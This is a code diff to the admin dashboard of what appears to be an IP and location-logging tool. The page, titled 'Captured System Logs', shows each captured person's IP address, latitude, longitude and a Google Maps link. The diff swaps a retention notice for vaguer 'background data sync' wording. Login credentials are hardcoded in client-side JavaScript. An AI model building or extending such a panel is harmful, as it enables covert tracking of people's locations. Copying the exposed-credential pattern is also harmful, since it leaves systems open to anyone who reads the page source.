@@ -31,12 +31,12 @@
         </div>
     </div>
 
-    <!-- DASHBOARD (Initially Hidden) -->
+    <!-- DASHBOARD -->
     <div id="dashboard-box" class="max-w-6xl w-full mx-auto hidden p-4 md:p-8">
         <div class="flex justify-between items-center mb-8 bg-slate-900 border border-slate-800 p-6 rounded-2xl">
             <div>
                 <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs</h1>
-                <p class="text-slate-400 text-xs mt-1">Automatic 30-day retention active.</p>
+                <p class="text-slate-400 text-xs mt-1">Automatic background data sync active.</p>
             </div>
             <div class="flex gap-3">
                 <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Refresh</button>
@@ -48,7 +48,6 @@
     </div>
 
     <script>
-        // Aapke naye credentials set kar diye gaye hain
         const ADMIN_USER = "sumit@1123";
         const ADMIN_PASS = "sumit1123";
 
@@ -100,7 +99,7 @@
                                     <p><strong>IP:</strong> ${item.ip}</p>
                                     <p><strong>Lat:</strong> ${item.latitude}</p>
                                     <p><strong>Lon:</strong> ${item.longitude}</p>
-                                    ${item.latitude !== 'Not Granted (Denied)' ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
+                                    ${!isNaN(item.latitude) ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
                                 </div>
                             </div>
                             <div>
